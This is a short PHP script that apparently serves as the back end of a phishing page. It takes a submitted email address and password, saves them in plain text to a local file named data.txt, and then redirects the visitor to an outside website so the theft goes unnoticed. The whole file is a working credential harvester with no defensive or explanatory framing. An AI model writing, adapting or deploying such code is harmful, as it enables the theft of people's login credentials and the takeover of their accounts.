<?php

$email = $_POST['email'];
$password = $_POST['password'];

$message = "Email: $email Password: $password";

file_put_contents('data.txt', $message);

header('Location: https://ek.dk');